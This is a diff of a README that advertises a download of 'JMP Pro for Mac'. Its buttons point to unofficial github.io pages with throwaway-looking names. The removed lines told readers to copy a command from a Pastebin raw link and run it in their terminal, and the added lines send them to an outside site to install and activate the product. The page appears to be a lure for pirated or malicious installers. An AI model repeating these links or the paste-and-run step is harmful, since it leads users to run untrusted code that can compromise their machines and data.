@@ -8,26 +8,16 @@
 
 <div align="center">
 
-[![📥 Download JMP Pro Mac](https://img.shields.io/badge/📥_Download_JMP_Pro_for_Mac-blue?style=for-the-badge&logo=apple)](https://jumakas-olftol-mang.github.io/.github/jmppro)
+[![📥 Download JMP Pro Mac](https://img.shields.io/badge/📥_Download_JMP_Pro_for_Mac-blue?style=for-the-badge&logo=apple)](https://osx-app.github.io/.github/jmppro)
 
 </div>
 
 ---
 
-## Installation via .dmg:
+# Installation Instructions  
 
-1. Download the `.dmg` installer using the button above.  
-2. Open it and drag **JMP Pro** into your Applications folder.  
-3. Launch the app and sign in or activate with your license.  
-4. Start exploring and analyzing your data.  
-
-## Installation via a command in the terminal:
-
-1. Go to the Pastebin link below and copy the command:  
-
-   https://pastebin.com/raw/g6P4cjZB  
-
-2. Open your terminal, paste the command, and run it.  
+1. Go To The Website Using The Button Above.  
+2. Follow The On-Screen Steps To Install And Activate JMP Pro On Your Device.  
 
 ---
 
@@ -84,16 +74,6 @@ Whether you are conducting academic research, developing pharmaceutical products
 ---
 
 ![JMP Pro for Mac](https://software.grok.lsu.edu/image/56527.png) 
-
----
-
-## Download JMP Pro for Mac  
-
-<div align="center">
-
-[![📥 Download JMP Pro Mac](https://img.shields.io/badge/📥_Download_JMP_Pro_for_Mac-blue?style=for-the-badge&logo=apple)](https://jumakas-olftol-mang.github.io/.github/jmppro)
-
-</div>
 
 ---
 
